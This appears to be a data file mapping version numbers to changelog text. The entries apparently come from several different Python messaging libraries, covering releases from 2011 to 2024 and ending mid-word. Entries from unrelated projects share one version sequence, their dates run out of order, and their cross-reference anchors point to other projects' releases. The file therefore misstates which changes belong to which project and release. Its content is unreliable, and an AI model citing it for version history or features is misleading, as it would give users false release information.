"1.2.1": "=====\n:release-date: 2011-07-29 12:52 P.M BST\n:release-by: Ask Solem\n\n* Now depends on amqplib >= 1.0.0.\n\n* Redis: Now automatically deletes auto_delete queues at ``basic_cancel``.\n\n* ``serialization.unregister`` added so it is possible to remove unwanted\n  seralizers.\n\n* Fixes MemoryError while importing ctypes on SELinux (Issue 52).\n\n* ``Connection.autoretry`` is a version of ``ensure`` that works\n  with arbitrary functions (i.e. it does not need an associated object\n  that implements the ``revive`` method.\n\n  Example usage:\n\n  .. code-block:: python\n\n        channel = connection.channel()\n        try:\n            ret, channel = connection.autoretry(send_messages, channel=channel)\n        finally:\n            channel.close()\n\n* ``ConnectionPool.acquire`` no longer force establishes the connection.\n\n    The connection will be established as needed.\n\n* ``Connection.ensure`` now supports an ``on_revive`` callback\n  that is applied whenever the connection is re-established.\n\n* ``Consumer.consuming_from(queue)`` returns True if the Consumer is\n  consuming from ``queue``.\n\n* ``Consumer.cancel_by_queue`` did not remove the queue from ``queues``.\n\n* ``compat.ConsumerSet.add_queue_from_dict`` now automatically declared\n  the queue if ``auto_declare`` set.\n\n.. _version-1.2.0:\n\n", "1.2.0": "=====\n:release-date: 2018-01-06 4:30 P.M UTC+2\n:release-by: Omer Katz\n\n- Added Python 3.7 support.\n\n  Contributed by **Jon Dufresne** & **:github_user:`dequis`**\n\n- Handle bound methods in weak reference promise instances.\n\n  Contributed by **George Psarakis**\n\nDocumentation fixes, CI adjustments and cleanups by:\n\n- **Omer Katz**\n- **Jon Dufresne**\n- **Edward Betts**\n- **Jacopo Notarstefano**\n- **Christopher Hoskin**\n- **Fahad Siddiqui**\n\n.. _version-1.1.4:\n\n", "1.1.0": "=====\n:release-date: 2016-04-21 01:30 P.M PDT\n:release-by: Ask Solem\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now passes partial\n  args/kwargs to the errback:\n\n    .. code-block:: pycon\n\n        >>> p = promise(args=(self,), on_error=handle_error)\n        >>> p.throw(exc)   --> handle_error(self, exc)\n\n- New :class:`vine.abstract.ThenableProxy` can be used to add\n  promise-capabilities to a class by forwarding to a different promise.\n\n    .. code-block:: python\n\n        from vine import promise\n        from vine.abstract import ThenableProxy\n\n        class P(ThenableProxy):\n\n            def __init__(self, on_success=None, on_error=None):\n                self._set_promise_target(promise(\n                    args=(self,), callback=on_success, on_error=on_error,\n                ))\n\n        p = P()\n        p.then(download_file(url)).then(extract_file)\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now supports a propagate\n  argument that can be set to False to never reraise the exception.\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now also reraises the\n  current exception from the stack, if the exc argument is passed and that\n  value is the same as the current exception.\n\n- :meth:`Thenable.register() <vine.abstract.Thenable.register>` can now be\n  used as a decorator.\n\n- Argument to :meth:`promise.throw1(exc) <vine.promises.promise.throw1>` can now be\n  :const:`None` to use the current exception.\n\n- ``monotonic()`` now uses ``librt.so.0`` as an alternative if ``librt.so.1``\n  does not exist.\n\n    Contributed by Fahad Siddiqui.\n\n.. _version-1.0.2:\n\n", "1.0.13": "======\n:release-date: 2013-07-31 04:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed problems with the SSL transport (Issue 15).\n\n    Fix contributed by Adrien Guinet.\n\n- Small optimizations\n\n.. _version-1.0.12:\n\n", "1.0.12": "======\n:release-date: 2013-06-25 02:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed another Python 3 compatibility problem.\n\n.. _version-1.0.11:\n\n", "1.0.11": "======\n:release-date: 2013-04-11 06:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed Python 3 incompatibility in ``amqp/transport.py``.\n\n.. _version-1.0.10:\n\n", "1.0.10": "======\n:release-date: 2013-03-21 03:30 P.M UTC\n:release-by: Ask Solem\n\n- Fixed Python 3 incompatibility in ``amqp/serialization.py``.\n  (Issue 11).\n\n.. _version-1.0.9:\n\n", "1.0.9": "=====\n:release-date: 2013-03-08 10:40 A.M UTC\n:release-by: Ask Solem\n\n- Publisher ack callbacks should now work after typo fix (Issue 9).\n\n- ``channel(explicit_id)`` will now claim that id from the array\n  of unused channel ids.\n\n- Fixes Jython compatibility.\n\n.. _version-1.0.8:\n\n", "1.0.8": "=====\n:release-date: 2013-02-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed SyntaxError on Python 2.5\n\n.. _version-1.0.7:\n\n", "1.0.7": "=====\n:release-date: 2011-03-28 05:45 P.M CEST\n:release-by: Ask Solem\n\n* Now depends on anyjson 0.3.1\n\n    cjson is no longer a recommended json implementation, and anyjson\n    will now emit a deprecation warning if used.\n\n* Please note that the Pika backend only works with version 0.5.2.\n\n    The latest version (0.9.x) drastically changed API, and it is not\n    compatible yet.\n\n* on_decode_error is now called for exceptions in message_to_python\n  (Issue 24).\n\n* Redis: did not respect QoS settings.\n\n* Redis: Creating a connection now ensures the connection is established.\n\n    This means ``Connection.ensure_connection`` works properly with\n    Redis.\n\n* consumer_tag argument to ``Queue.consume`` can't be :const:`None`\n  (Issue 21).\n\n    A None value is now automatically converted to empty string.\n    An empty string will make the server generate a unique tag.\n\n* Connection now supports a ``transport_options`` argument.\n\n    This can be used to pass additional arguments to transports.\n\n* Pika: ``drain_events`` raised :exc:`socket.timeout` even if no timeout\n  set (Issue 8).\n\n.. version-1.0.6:\n\n", "1.0.6": "=====\n:release-date: 2011-03-22 04:00 P.M CET\n:release-by: Ask Solem\n\n* The ``delivery_mode`` aliases (persistent/transient) were not automatically\n  converted to integer, and would cause a crash if using the amqplib\n  transport.\n\n* Redis: The redis-py :exc:`InvalidData` exception suddenly changed name to\n  :exc:`DataError`.\n\n* The :envvar:`KOMBU_LOG_DEBUG` environment variable can now be set to log all\n  channel method calls.\n\n  Support for the following environment variables have been added:\n\n    * :envvar:`KOMBU_LOG_CHANNEL` will wrap channels in an object that\n      logs every method call.\n\n    * :envvar:`KOMBU_LOG_DEBUG` both enables channel logging and configures the\n      root logger to emit messages to standard error.\n\n    **Example Usage**:\n\n    .. code-block:: console\n\n        $ KOMBU_LOG_DEBUG=1 python\n        >>> from kombu import Connection\n        >>> conn = Connection()\n        >>> channel = conn.channel()\n        Start from server, version: 8.0, properties:\n            {u'product': 'RabbitMQ',..............  }\n        Open OK! known_hosts []\n        using channel_id: 1\n        Channel open\n        >>> channel.queue_declare('myq', passive=True)\n        [Kombu channel:1] queue_declare('myq', passive=True)\n        (u'myq', 0, 1)\n\n.. _version-1.0.5:\n\n", "1.0.5": "=====\n:release-date: 2011-03-17 04:00 P.M CET\n:release-by: Ask Solem\n\n* Fixed memory leak when creating virtual channels.  All virtual transports\n  affected (redis, mongodb, memory, django, sqlalchemy, couchdb, beanstalk).\n\n* Virtual Transports: Fixed potential race condition when acking messages.\n\n    If you have been affected by this, the error would show itself as an\n    exception raised by the OrderedDict implementation. (``object no longer\n    exists``).\n\n* MongoDB transport requires the ``findandmodify`` command only available in\n  MongoDB 1.3+, so now raises an exception if connected to an incompatible\n  server version.\n\n* Virtual Transports: ``basic.cancel`` should not try to remove unknown\n  consumer tag.\n\n.. _version-1.0.4:\n\n", "1.0.4": "=====\n:release-date: 2011-02-28 04:00 P.M CET\n:release-by: Ask Solem\n\n* Added Transport.polling_interval\n\n    Used by django-kombu to increase the time to sleep between SELECTs when\n    there are no messages in the queue.\n\n    Users of django-kombu should upgrade to django-kombu v0.9.2.\n\n.. _version-1.0.3:\n\n", "1.0.3": "=====\n:release-date: 2011-02-12 04:00 P.M CET\n:release-by: Ask Solem\n\n* ConnectionPool: Re-connect if amqplib connection closed\n\n* Adds ``Queue.as_dict`` + ``Exchange.as_dict``.\n\n* Copyright headers updated to include 2011.\n\n.. _version-1.0.2:\n\n", "1.0.2": "=====\n:release-date: 2016-04-11 05:30 P.M PDT\n:release-by: Ask Solem\n\n- ``promise.throw()`` now supports second ``traceback`` argument to\n  throw exception with specific traceback.\n\n    Contributed by Ionel Cristian M\u0103rie\u0219.\n\n.. _version-1.0.1:\n\n", "1.0.1": "=====\n:release-date: 2016-04-11 03:00 P.M PDT\n:release-by: Ask Solem\n\n- Adds vine.five.python_2_unicode_compatible.\n\n.. _version-1.0.0:\n\n", "1.0.0": "=====\n:release-date: 2016-04-07 06:02 P.M PDT\n:release-by: Ask Solem\n\n- Initial release.\n\n\n Change log\n\n", "0.9.4": "=============\n\n- Adds support for ``exchange_bind`` and ``exchange_unbind``.\n\n    Contributed by Rumyana Neykova\n\n- Fixed bugs in funtests and demo scripts.\n\n    Contributed by Rumyana Neykova\n\n.. _version-0.9.3:\n\n", "0.9.3": "=============\n\n- Fixed bug that could cause the consumer to crash when reading\n  large message payloads asynchronously.\n\n- Serialization error messages now include the invalid value.\n\n.. _version-0.9.2:\n\n", "0.9.2": "=============\n\n- Consumer cancel notification support was broken (Issue 1)\n\n    Fix contributed by Andrew Grangaard\n\n.. _version-0.9.1:\n\n", "0.9.1": "=============\n\n- Supports draining events from multiple channels (``Connection.drain_events``)\n- Support for timeouts\n- Support for heartbeats\n    - ``Connection.heartbeat_tick(rate=2)`` must called at regular intervals\n      (half of the heartbeat value if rate is 2).\n    - Or some other scheme by using ``Connection.send_heartbeat``.\n- Supports RabbitMQ extensions:\n    - Consumer Cancel Notifications\n        - by default a cancel results in ``ChannelError`` being raised\n        - but not if a ``on_cancel`` callback is passed to ``basic_consume``.\n    - Publisher confirms\n        - ``Channel.confirm_select()`` enables publisher confirms.\n        - ``Channel.events['basic_ack'].append(my_callback)`` adds a callback\n          to be called when a message is confirmed. This callback is then\n          called with the signature ``(delivery_tag, multiple)``.\n- Support for ``basic_return``\n- Uses AMQP 0-9-1 instead of 0-8.\n    - ``Channel.access_request`` and ``ticket`` arguments to methods\n      **removed**.\n    - Supports the ``arguments`` argument to ``basic_consume``.\n    - ``internal`` argument to ``exchange_declare`` removed.\n    - ``auto_delete`` argument to ``exchange_declare`` deprecated\n    - ``insist`` argument to ``Connection`` removed.\n    - ``Channel.alerts`` has been removed.\n    - Support for ``Channel.basic_recover_async``.\n    - ``Channel.basic_recover`` deprecated.\n- Exceptions renamed to have idiomatic names:\n    - ``AMQPException`` -> ``AMQPError``\n    - ``AMQPConnectionException`` -> ConnectionError``\n    - ``AMQPChannelException`` -> ChannelError``\n    - ``Connection.known_hosts`` removed.\n    - ``Connection`` no longer supports redirects.\n    - ``exchange`` argument to ``queue_bind`` can now be empty\n      to use the \"default exchange\".\n- Adds ``Connection.is_alive`` that tries to detect\n  whether the connection can still be used.\n- Adds ``Connection.connection_errors`` and ``.channel_errors``,\n  a list of recoverable errors.\n- Exposes the underlying socket as ``Connection.sock``.\n- Adds ``Channel.no_ack_consumers`` to keep track of consumer tags\n  that set the no_ack flag.\n- Slightly better at error recovery\n\n\n.. _changelog:\n\n================\n Change history\n================\n\n.. _version-5.4.0rc3:\n\n", "5.4.0rc3": "========\n:release-date: 22 July, 2024\n:release-by: Tomer Nosrati\n\n- Fixed typo in Changelog for v5.4.0rc2 (2057)\n- Use logging.Logger.warning (2058)\n- Pin zstandard to latest version 0.23.0 (2060)\n- Update mypy to 1.11.0 (2062)\n- Update pytest to 8.3.1 (2063)\n- SQS: add support for passing MessageAttributes (2059)\n\n.. _version-5.4.0rc2:\n\n", "5.4.0rc2": "========\n\n:release-date: 2024-03-27\n:release-by: Tomer Nosrati\n\n- feat(daemon): allows daemonization options to be fetched from app settings (8553)\n- Fixed version documentation tag from 8553 in configuration.rst (8802)\n- Upgraded Sphinx from v5.3.0 to v7.x.x (8803)\n- Update elasticsearch requirement from <=8.11.1 to <=8.12.0 (8810)\n- Update elastic-transport requirement from <=8.11.0 to <=8.12.0 (8811)\n- Update cryptography to 42.0.0 (8814)\n- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (8806)\n- Update cryptography to 42.0.1 (8817)\n- Limit moto to <5.0.0 until the breaking issues are fixed (8820)\n- Enable efficient `chord` when using dynamicdb as backend store (8783)\n- Add a Task class specialised for Django (8491)\n- Sync kombu versions in requirements and setup.cfg (8825)\n- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (8826)\n- Update cryptography to 42.0.2 (8827)\n- Docfix: pip install celery[sqs] -> pip install \"celery[sqs]\" (8829)\n- Bump pre-commit/action from 3.0.0 to 3.0.1 (8835)\n- Support moto 5.0 (8838)\n- Another fix for `link_error` signatures being `dict`s instead of `Signature` s (8841)\n- Bump codecov/codecov-action from 3 to 4 (8831)\n- Upgrade from pytest-celery v1.0.0b1 -> v1.0.0b2 (8843)\n- Bump pytest from 7.4.4 to 8.0.0 (8823)\n- Update pre-commit to 3.6.1 (8839)\n- Update cryptography to 42.0.3 (8854)\n- Bump pytest from 8.0.0 to 8.0.1 (8855)\n- Update cryptography to 42.0.4 (8864)\n- Update pytest to 8.0.2 (8870)\n- Update cryptography to 42.0.5 (8869)\n- Update elasticsearch requirement from <=8.12.0 to <=8.12.1 (8867)\n- Eliminate consecutive chords generated by group | task upgrade (8663)\n- Make custom remote control commands available in CLI (8489)\n- Add Google Cloud Storage (GCS) backend (8868)\n- Bump msgpack from 1.0.7 to 1.0.8 (8885)\n- Update pytest to 8.1.0 (8886)\n- Bump pytest-timeout from 2.2.0 to 2.3.1 (8894)\n- Bump pytest-subtests from 0.11.0 to 0.12.1 (8896)\n- Bump mypy from 1.8.0 to 1.9.0 (8898)\n- Update pytest to 8.1.1 (8901)\n- Update contributing guide to use ssh upstream url (8881)\n- Fix recursive result parents on group in middle of chain (8903)\n- Bump pytest-celery to 1.0.0b4 (8899)\n- Adjusted smoke tests CI time limit (8907)\n- Update pytest-rerunfailures to 14.0 (8910)\n- Use the \"all\" extra for pytest-celery (8911)\n- Fix typos and grammar (8915)\n- Bump pytest-celery to 1.0.0rc1 (8918)\n- Print safe_say() to stdout for non-error flows (8919)\n- Update pytest-cov to 5.0.0 (8924)\n- Bump pytest-celery to 1.0.0rc2 (8928)\n\n.. _version-5.4.0rc1:\n\n", "5.4.0rc1": "========\n\n:release-date: 2024-01-17 7:00 P.M GMT+2\n:release-by: Tomer Nosrati\n\n", "5.3.7": "=====\n:release-date: 11 April, 2024\n:release-by: Tomer Nosrati\n\nThe release of v5.3.6 was missing the bumbversion commit so v5.3.7 is only released to sync it back.\n\n.. _version-5.3.6:\n\n", "5.3.6": "=====\n\n:release-date: 2023-11-22  9:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\nThis release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. \nThe code changes are mostly fix for regressions. More details can be found below.\n\n- Increased docker-build CI job timeout from 30m -> 60m (8635)\n- Incredibly minor spelling fix. (8649)\n- Fix non-zero exit code when receiving remote shutdown (8650)\n- Update task.py get_custom_headers missing 'compression' key (8633)\n- Update kombu>=5.3.4 to fix SQS request compatibility with boto JSON serializer (8646)\n- test requirements version update (8655)\n- Update elasticsearch version (8656)\n- Propagates more ImportErrors during autodiscovery (8632)\n\n.. _version-5.3.5:\n\n", "5.3.5": "=====\n\n:release-date: 2023-11-10  7:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Update test.txt versions (8481)\n- fix os.getcwd() FileNotFoundError (8448)\n- Fix typo in CONTRIBUTING.rst (8494)\n- typo(doc): configuration.rst (8484)\n- assert before raise (8495)\n- Update GHA checkout version (8496)\n- Fixed replaced_task_nesting (8500)\n- Fix code indentation for route_task() example (8502)\n- support redis 5.x (8504)\n- Fix typos in test_canvas.py (8498)\n- Marked flaky tests (8508)\n- Fix typos in calling.rst (8506)\n- Added support for replaced_task_nesting in chains (8501)\n- Fix typos in canvas.rst (8509)\n- Patch Version Release Checklist (8488)\n- Added Python 3.11 support to Dockerfile (8511)\n- Dependabot (Celery) (8510)\n- Bump actions/checkout from 3 to 4 (8512)\n- Update ETA example to include timezone (8516)\n- Replaces datetime.fromisoformat with the more lenient dateutil parser (8507)\n- Fixed indentation in Dockerfile for Python 3.11 (8527)\n- Fix git bug in Dockerfile (8528)\n- Tox lint upgrade from Python 3.9 to Python 3.11 (8526)\n- Document gevent concurrency (8520)\n- Update test.txt (8530)\n- Celery Docker Upgrades (8531)\n- pyupgrade upgrade v3.11.0 -> v3.13.0 (8535)\n- Update msgpack.txt (8548)\n- Update auth.txt (8547)\n- Update msgpack.txt to fix build issues (8552)\n- Basic ElasticSearch / ElasticClient 8.x Support (8519)\n- Fix eager tasks does not populate name field (8486)\n- Fix typo in celery.app.control (8563)\n- Update solar.txt ephem (8566)\n- Update test.txt pytest-timeout (8565)\n- Correct some mypy errors (8570)\n- Update elasticsearch.txt (8573)\n- Update test.txt deps (8574)\n- Update test.txt (8590)\n- Improved the \"Next steps\" documentation (8561). (8600)\n- Disabled couchbase tests due to broken package breaking main (8602)\n- Update elasticsearch deps (8605)\n- Update cryptography==41.0.5 (8604)\n- Update pytest==7.4.3 (8606)\n- test initial support of python 3.12.x (8549)\n- updated new versions to fix CI (8607)\n- Update zstd.txt (8609)\n- Fixed CI Support with Python 3.12 (8611)\n- updated CI, docs and classifier for next release (8613)\n- updated dockerfile to add python 3.12 (8614)\n- lint,mypy,docker-unit-tests -> Python 3.12 (8617)\n- Correct type of `request` in `task_revoked` documentation (8616)\n- update docs docker image (8618)\n- Fixed RecursionError caused by giving `config_from_object` nested mod\u2026 (8619)\n- Fix: serialization error when gossip working (6566)\n- [documentation] broker_connection_max_retries of 0 does not mean \"retry forever\" (8626)\n- added 2 debian package for better stability in Docker (8629)\n\n.. _version-5.3.4:\n\n", "5.3.4": "=====\n\n:release-date: 2023-09-03 10:10 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:\n\n   - Revert \"store children with database backend\" (8475)\n   - Revert \"Fix eager tasks does not populate name field\" (8476)\n\n- Bugfix: Removed unecessary stamping code from _chord.run() (8339)\n- User guide fix (hotfix for 1755) (8342)\n- store children with database backend (8338)\n- Stamping bugfix with group/chord header errback linking (8347)\n- Use argsrepr and kwargsrepr in LOG_RECEIVED (8301)\n- Fixing minor typo in code example in calling.rst (8366)\n- add documents for timeout settings (8373)\n- fix: copyright year (8380)\n- setup.py: enable include_package_data (8379)\n- Fix eager tasks does not populate name field (8383)\n- Update test.txt dependencies (8389)\n- Update auth.txt deps (8392)\n- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (8391)\n- Support preload options for shell and purge commands (8374)\n- Implement safer ArangoDB queries (8351)\n- integration test: cleanup worker after test case (8361)\n- Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (8400)\n- Update README.rst (8404)\n- Update README.rst (8408)\n- fix(canvas): add group index when unrolling tasks (8427)\n- fix(beat): debug statement should only log AsyncResult.id if it exists (8428)\n- Lint fixes & pre-commit autoupdate (8414)\n- Update auth.txt (8435)\n- Update mypy on test.txt (8438)\n- added missing kwargs arguments in some cli cmd (8049)\n- Fix 8431: Set format_date to False when calling _get_result_meta on mongo backend (8432)\n- Docs: rewrite out-of-date code (8441)\n- Limit redis client to 4.x since 5.x fails the test suite (8442)\n- Limit tox to < 4.9 (8443)\n- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren\u2019t reliable (8446)\n- doc update from 7651 (8451)\n- Remove tox version limit (8464)\n- Fixed AttributeError: 'str' object has no attribute (8463)\n- Upgraded Kombu from 5.3.1 -> 5.3.2 (8468)\n- Document need for CELERY_ prefix on CLI env vars (8469)\n- Use string value for CELERY_SKIP_CHECKS envvar (8462)\n- Revert \"store children with database backend\" (8475)\n- Revert \"Fix eager tasks does not populate name field\" (8476)\n- Update Changelog (8474)\n- Remove as it seems to be buggy. (8340)\n- Revert \"Add Semgrep to CI\" (8477)\n- Revert \"Revert \"Add Semgrep to CI\"\" (8478)\n\n.. _version-5.3.3:\n\n", "5.3.3": "==============\n\n:release-date: 2023-08-31 1:47 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has been yanked due to breaking API changes. The breaking changes include:\n\n   - Store children with database backend (8338)\n   - Fix eager tasks does not populate name field (8383)\n\n- Fixed changelog for 5.3.2 release docs.\n\n.. _version-5.3.2:\n\n", "5.3.2": "==============\n\n:release-date: 2023-08-31 1:30 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has been yanked due to breaking API changes. The breaking changes include:\n\n   - Store children with database backend (8338)\n   - Fix eager tasks does not populate name field (8383)\n\n- Bugfix: Removed unecessary stamping code from _chord.run() (8339)\n- User guide fix (hotfix for 1755) (8342)\n- Store children with database backend (8338)\n- Stamping bugfix with group/chord header errback linking (8347)\n- Use argsrepr and kwargsrepr in LOG_RECEIVED (8301)\n- Fixing minor typo in code example in calling.rst (8366)\n- Add documents for timeout settings (8373)\n- Fix: copyright year (8380)\n- Setup.py: enable include_package_data (8379)\n- Fix eager tasks does not populate name field (8383)\n- Update test.txt dependencies (8389)\n- Update auth.txt deps (8392)\n- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (8391)\n- Support preload options for shell and purge commands (8374)\n- Implement safer ArangoDB queries (8351)\n- Integration test: cleanup worker after test case (8361)\n- Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (8400)\n- Update README.rst (8404)\n- Update README.rst (8408)\n- Fix(canvas): add group index when unrolling tasks (8427)\n- Fix(beat): debug statement should only log AsyncResult.id if it exists (8428)\n- Lint fixes & pre-commit autoupdate (8414)\n- Update auth.txt (8435)\n- Update mypy on test.txt (8438)\n- Added missing kwargs arguments in some cli cmd (8049)\n- Fix 8431: Set format_date to False when calling _get_result_meta on mongo backend (8432)\n- Docs: rewrite out-of-date code (8441)\n- Limit redis client to 4.x since 5.x fails the test suite (8442)\n- Limit tox to < 4.9 (8443)\n- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren\u2019t reliable (8446)\n- Doc update from 7651 (8451)\n- Remove tox version limit (8464)\n- Fixed AttributeError: 'str' object has no attribute (8463)\n- Upgraded Kombu from 5.3.1 -> 5.3.2 (8468)\n\n.. _version-5.3.1:\n\n", "5.3.1": "=====\n\n:release-date: 2023-06-18  8:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Upgrade to latest pycurl release (7069).\n- Limit librabbitmq>=2.0.0; python_version < '3.11' (8302).\n- Added initial support for python 3.11 (8304).\n- ChainMap observers fix (8305).\n- Revert optimization CLI flag behaviour back to original.\n- Restrict redis 4.5.5 as it has severe bugs (8317).\n- Tested pypy 3.10 version in CI (8320).\n- Bump new version of kombu to 5.3.1 (8323).\n- Fixed a small float value of retry_backoff (8295).\n- Limit pyro4 up to python 3.10 only as it is (8324).\n\n.. _version-5.3.0:\n\n", "5.3.0": "=====\n\n:release-date: 2023-06-06 12:00 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Test kombu 5.3.0 & minor doc update (8294).\n- Update librabbitmq.txt > 2.0.0 (8292).\n- Upgrade syntax to py3.8 (8281).\n\n.. _version-5.3.0rc2:\n\n", "5.3.0rc2": "========\n\n:release-date: 2023-05-31 9:00 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Add missing dependency.\n- Fix exc_type being the exception instance rather.\n- Fixed revoking tasks by stamped headers (8269).\n- Support sqlalchemy 2.0 in tests (8271).\n- Fix docker (8275).\n- Update redis.txt to 4.5 (8278).\n- Update kombu>=5.3.0rc2.\n\n\n.. _version-5.3.0rc1:\n\n", "5.3.0rc1": "========\n\n:release-date: 2023-05-11 4:24 P.M GMT+2\n:release-by: Tomer Nosrati\n\n- fix functiom name by cuishuang in 8087\n- Update CELERY_TASK_EAGER setting in user guide by thebalaa in 8085\n- Stamping documentation fixes & cleanups by Nusnus in 8092\n- switch to maintained pyro5 by auvipy in 8093\n- udate dependencies of tests by auvipy in 8095\n- cryptography==39.0.1 by auvipy in 8096\n- Annotate celery/security/certificate.py by Kludex in 7398\n- Deprecate parse_iso8601 in favor of fromisoformat by stumpylog in 8098\n- pytest==7.2.2 by auvipy in 8106\n- Type annotations for celery/utils/text.py by max-muoto in 8107\n- Update web framework URLs by sblondon in 8112\n- Fix contribution URL by sblondon in 8111\n- Trying to clarify CERT_REQUIRED by pamelafox in 8113\n- Fix potential AttributeError on 'stamps' by Darkheir in 8115\n- Type annotations for celery/apps/beat.py by max-muoto in 8108\n- Fixed bug where retrying a task loses its stamps by Nusnus in 8120\n- Type hints for celery/schedules.py by max-muoto in 8114\n- Reference Gopher Celery in README by marselester in 8131\n- Update sqlalchemy.txt by auvipy in 8136\n- azure-storage-blob 12.15.0 by auvipy in 8137\n- test kombu 5.3.0b3 by auvipy in 8138\n- fix: add expire string parse. by Bidaya0 in 8134\n- Fix worker crash on un-pickleable exceptions by youtux in 8133\n- CLI help output: avoid text rewrapping by click by woutdenolf in 8152\n- Warn when an unnamed periodic task override another one. by iurisilvio in 8143\n- Fix Task.handle_ignore not wrapping exceptions properly by youtux in 8149\n- Hotfix for (8120) - Stamping bug with retry by Nusnus in 8158\n- Fix integration test by youtux in 8156\n- Fixed bug in revoke_by_stamped_headers where impl did not match doc by Nusnus in 8162\n- Align revoke and revoke_by_stamped_headers return values (terminate=True) by Nusnus in 8163\n- Update & simplify GHA pip caching by stumpylog in 8164\n- Update auth.txt by auvipy in 8167\n- Update test.txt versions by auvipy in 8173\n- remove extra = from test.txt by auvipy in 8179\n- Update sqs.txt kombu[sqs]>=5.3.0b3 by auvipy in 8174\n- Added signal triggered before fork by jaroslawporada in 8177\n- Update documentation on SQLAlchemy by max-muoto in 8188\n- Deprecate pytz and use zoneinfo by max-muoto in 8159\n- Update dev.txt by auvipy in 8192\n- Update test.txt by auvipy in 8193\n- Update test-integration.txt by auvipy in 8194\n- Update zstd.txt by auvipy in 8195\n- Update s3.txt by auvipy in 8196\n- Update msgpack.txt by auvipy in 8199\n- Update solar.txt by auvipy in 8198\n- Add Semgrep to CI by Nusnus in 8201\n- Added semgrep to README.rst by Nusnus in 8202\n- Update django.txt by auvipy in 8197\n- Update redis.txt 4.3.6 by auvipy in 8161\n- start removing codecov from pypi by auvipy in 8206\n- Update test.txt dependencies by auvipy in 8205\n- Improved doc for: worker_deduplicate_successful_tasks by Nusnus in 8209\n- Renamed revoked_headers to revoked_stamps by Nusnus in 8210\n- Ensure argument for map is JSON serializable by candleindark in 8229\n\n.. _version-5.3.0b2:\n\n", "5.3.0b3": "=======\n:release-date: 20 Mar, 2023\n:release-by: Asif Saif Uddin\n\n- Use SPDX license expression in project metadata.\n- Allowing Connection.ensure() to retry on specific exceptions given by policy (1629).\n- Redis==4.3.4 temporarilly in an attempt to avoid BC (1634).\n- Add managed identity support to azure storage queue (1631).\n- Support sqla v2.0 (1651).\n- Switch to Pyro5 (1655).\n- Remove unused _setupfuns from serialization.py.\n- Refactor: Refactor utils/json (1659).\n- Adapt the mock to correctly mock the behaviors as implemented on Python 3.10. (Ref 1663).\n\n\n.. _version-5.3.0b2:\n\n", "5.3.0b2": "=======\n\n:release-date: 2023-02-19 1:47 P.M GMT+2\n:release-by: Asif Saif Uddin\n\n- BLM-2: Adding unit tests to chord clone by Nusnus in 7668\n- Fix unknown task error typo by dcecile in 7675\n- rename redis integration test class so that tests are executed by wochinge in 7684\n- Check certificate/private key type when loading them by qrmt in 7680\n- Added integration test_chord_header_id_duplicated_on_rabbitmq_msg_duplication() by Nusnus in 7692\n- New feature flag: allow_error_cb_on_chord_header - allowing setting an error callback on chord header by Nusnus in 7712\n- Update README.rst sorting Python/Celery versions by andrebr in 7714\n- Fixed a bug where stamping a chord body would not use the correct stamping method by Nusnus in 7722\n- Fixed doc duplication typo for Signature.stamp() by Nusnus in 7725\n- Fix issue 7726: variable used in finally block may not be instantiated by woutdenolf in 7727\n- Fixed bug in chord stamping with another chord as a body + unit test by Nusnus in 7730\n- Use \"describe_table\" not \"create_table\" to check for existence of DynamoDB table by maxfirman in 7734\n- Enhancements for task_allow_error_cb_on_chord_header tests and docs by Nusnus in 7744\n- Improved custom stamping visitor documentation by Nusnus in 7745\n- Improved the coverage of test_chord_stamping_body_chord() by Nusnus in 7748\n- billiard >= 3.6.3.0,<5.0 for rpm by auvipy in 7764\n- Fixed memory leak with ETA tasks at connection error when worker_cancel_long_running_tasks_on_connection_loss is enabled by Nusnus in 7771\n- Fixed bug where a chord with header of type tuple was not supported in the link_error flow for task_allow_error_cb_on_chord_header flag by Nusnus in 7772\n- Scheduled weekly dependency update for week 38 by pyup-bot in 7767\n- recreate_module: set spec to the new module by skshetry in 7773\n- Override integration test config using integration-tests-config.json by thedrow in 7778\n- Fixed error handling bugs due to upgrade to a newer version of billiard by Nusnus in 7781\n- Do not recommend using easy_install anymore by jugmac00 in 7789\n- GitHub Workflows security hardening by sashashura in 7768\n- Update ambiguous acks_late doc by Zhong-z in 7728\n- billiard >=4.0.2,<5.0 by auvipy in 7720\n- importlib_metadata remove deprecated entry point interfaces by woutdenolf in 7785\n- Scheduled weekly dependency update for week 41 by pyup-bot in 7798\n- pyzmq>=22.3.0 by auvipy in 7497\n- Remove amqp from the BACKEND_ALISES list by Kludex in 7805\n- Replace print by logger.debug by Kludex in 7809\n- Ignore coverage on except ImportError by Kludex in 7812\n- Add mongodb dependencies to test.txt by Kludex in 7810\n- Fix grammar typos on the whole project by Kludex in 7815\n- Remove isatty wrapper function by Kludex in 7814\n- Remove unused variable _range by Kludex in 7813\n- Add type annotation on concurrency/threads.py by Kludex in 7808\n- Fix linter workflow by Kludex in 7816\n- Scheduled weekly dependency update for week 42 by pyup-bot in 7821\n- Remove .cookiecutterrc by Kludex in 7830\n- Remove .coveragerc file by Kludex in 7826\n- kombu>=5.3.0b2 by auvipy in 7834\n- Fix readthedocs build failure by woutdenolf in 7835\n- Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by Nusnus in 7825\n- Stabilized 